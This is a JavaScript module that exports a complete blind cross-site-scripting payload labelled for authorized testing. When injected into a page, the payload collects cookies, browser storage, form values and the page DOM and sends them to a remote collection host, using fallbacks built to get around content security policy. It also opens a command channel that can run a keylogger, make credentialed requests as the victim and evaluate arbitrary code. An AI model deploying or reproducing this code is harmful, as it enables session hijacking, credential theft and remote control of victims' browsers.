// The injectable blind-XSS probe. Written as a real (syntax-valid) function and
// stringified for delivery; the worker substitutes __TOKEN__ / __BASE__ in the
// resulting string before serving it from GET /c/:token.
// Authorized security testing only.

export const PROBE = `(function () {
  'use strict';
  var TOKEN = '__TOKEN__', BASE = '__BASE__';
  if (window.__bx) { return; } window.__bx = 1;              // fire once per document
  var SID = Math.random().toString(36).slice(2) + Date.now().toString(36);

  function u8b64(s) {
    try { return btoa(unescape(encodeURIComponent(s))); }
    catch (e) { return btoa(String(s).replace(/[^\x00-\xff]/g, '?')); }
  }
  function cap(s, n) { s = String(s == null ? '' : s); return s.length > n ? s.slice(0, n) : s; }

  // ---------- automatic collection ----------
  function dumpStorage(o) {
    var r = {};
    try { for (var i = 0; i < o.length; i++) { var k = o.key(i); r[k] = cap(o.getItem(k), 4000); } } catch (e) {}
    return r;
  }
  function dumpForms() {
    var out = [];
    try {
      var fs = document.querySelectorAll('input,textarea,select');
      for (var i = 0; i < fs.length && i < 300; i++) {
        var el = fs[i];
        out.push({ tag: el.tagName, type: el.type || '', name: el.name || '', id: el.id || '', value: cap(el.value, 2000) });
      }
    } catch (e) {}
    return out;
  }
  function dumpMeta() {
    var m = {};
    try {
      var t = document.querySelectorAll('meta[name],meta[property],input[type=hidden]');
      for (var i = 0; i < t.length; i++) {
        var e = t[i];
        var k = e.getAttribute('name') || e.getAttribute('property') || e.name;
        if (k) { m[k] = cap(e.getAttribute('content') || e.value, 1000); }
      }
    } catch (e) {}
    return m;
  }
  function collect(withDom) {
    var r = {
      sid: SID, token: TOKEN, ts: Date.now(),
      url: location.href, referrer: document.referrer, title: cap(document.title, 500), origin: location.origin,
      ua: navigator.userAgent, cookies: document.cookie,
      nav: {
        platform: navigator.platform, lang: (navigator.languages || []).join(','),
        cores: navigator.hardwareConcurrency, mem: navigator.deviceMemory, screen: (screen.width + 'x' + screen.height)
      },
      storage: { local: dumpStorage(window.localStorage), session: dumpStorage(window.sessionStorage) },
      forms: dumpForms(), meta: dumpMeta()
    };
    if (withDom) { try { r.dom = cap(document.documentElement.outerHTML, 2000000); } catch (e) { r.dom = ''; } }
    return r;
  }

  // ---------- exfil: fetch -> sendBeacon -> chunked Image() (CSP-aware) ----------
  window.__bxq = window.__bxq || [];                          // retain refs so the beacons aren't GC'd before they fire
  function beaconImg(field, payload) {
    var b = encodeURIComponent(u8b64(payload)), size = 1500, n = Math.ceil(b.length / size) || 1;
    for (var i = 0; i < n; i++) {
      var im = new Image();
      im.onload = im.onerror = function () {};
      window.__bxq.push(im);
      im.src = BASE + '/p/' + TOKEN + '?s=' + SID + '&f=' + field + '&i=' + i + '&n=' + n + '&d=' + b.substr(i * size, size);
    }
  }
  function send(path, obj, field) {
    var body = JSON.stringify(obj);
    function fallback() {
      // fetch failed — usually connect-src CSP. sendBeacon shares connect-src AND returns a
      // misleading truthy value under CSP, so skip it; the image beacon rides img-src (a
      // separate directive). It can't carry a huge DOM over thousands of GETs, so send a
      // compact variant (drop the DOM; re-fetch it later via the 'dom' command).
      var compact = obj;
      if (obj && obj.dom) { compact = {}; for (var k in obj) { if (k !== 'dom') { compact[k] = obj[k]; } } compact.dom_omitted = true; }
      beaconImg(field || 'r', JSON.stringify(compact));
    }
    try {
      fetch(BASE + path, { method: 'POST', mode: 'cors', headers: { 'Content-Type': 'text/plain' }, body: body, keepalive: true })
        .catch(fallback);
    } catch (e) { fallback(); }
  }

  // ---------- interactive command channel ----------
  function reply(id, data) { send('/qr/' + id, { sid: SID, id: id, result: cap(typeof data === 'string' ? data : JSON.stringify(data), 2000000) }, 'q' + id); }
  function runCmd(c) {
    var kind = c.cmd, arg = '', sp = kind.indexOf(':');
    if (sp > -1) { arg = kind.slice(sp + 1); kind = kind.slice(0, sp); }
    try {
      if (kind === 'dom') { reply(c.id, document.documentElement.outerHTML); }
      else if (kind === 'cookies') { reply(c.id, document.cookie); }
      else if (kind === 'storage') { reply(c.id, { local: dumpStorage(localStorage), session: dumpStorage(sessionStorage) }); }
      else if (kind === 'forms') { reply(c.id, dumpForms()); }
      else if (kind === 'fetch') {                            // read a same-origin URL AS THE VICTIM
        fetch(arg, { credentials: 'include' }).then(function (r) { return r.text().then(function (t) { reply(c.id, { status: r.status, url: arg, body: cap(t, 2000000) }); }); })
          .catch(function (e) { reply(c.id, 'fetch error: ' + e); });
      }
      else if (kind === 'keylog') {                           // buffer ALL keystrokes and stream the growing log
        var tgt = arg ? document.querySelectorAll(arg) : [document];
        var kbuf = '', klastf = null, ktimer = null;
        var kflush = function () { send('/qr/' + c.id, { sid: SID, id: c.id, result: kbuf }, 'q' + c.id); };
        var konkey = function (ev) {
          var f = (ev.target && (ev.target.name || ev.target.id || ev.target.tagName)) || '';
          if (f !== klastf) { kbuf += (kbuf ? '\\n' : '') + '[' + f + '] '; klastf = f; }
          var k = ev.key;
          kbuf += (k && k.length === 1) ? k : '{' + k + '}';   // printable keys inline, named keys in {…}
          if (kbuf.length > 50000) { kbuf = kbuf.slice(-50000); }
          clearTimeout(ktimer); ktimer = setTimeout(kflush, 350);   // debounce bursts, then push the full buffer
        };
        for (var i = 0; i < tgt.length; i++) { tgt[i].addEventListener('keydown', konkey, true); }
        reply(c.id, 'keylogger attached to ' + (arg || 'document') + ' — keystrokes will accumulate here');
      }
      else if (kind === 'screenshot') {                       // best-effort; needs script-src to allow html2canvas
        var s = document.createElement('script');
        s.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
        s.onload = function () { window.html2canvas(document.body).then(function (cv) { reply(c.id, cv.toDataURL('image/png')); }); };
        s.onerror = function () { reply(c.id, 'screenshot unavailable (CSP blocked html2canvas) — use dom'); };
        document.head.appendChild(s);
      }
      else if (kind === 'eval') { var out = (0, eval)(arg); reply(c.id, out); }
      else { reply(c.id, 'unknown cmd: ' + kind); }
    } catch (e) { reply(c.id, 'cmd error: ' + e); }
  }

  // ---------- main ----------
  send('/r/' + TOKEN, collect(true), 'r');                    // initial full report (with DOM)
  function poll() {
    try {
      fetch(BASE + '/q/' + SID, { mode: 'cors' })
        .then(function (r) { return r.json(); })
        .then(function (cmds) { if (cmds && cmds.length) { for (var i = 0; i < cmds.length; i++) { runCmd(cmds[i]); } } })
        .catch(function () {});
    } catch (e) {}
    setTimeout(poll, 5000);                                   // keep session live while tab is open
  }
  setTimeout(poll, 3000);
})();`;
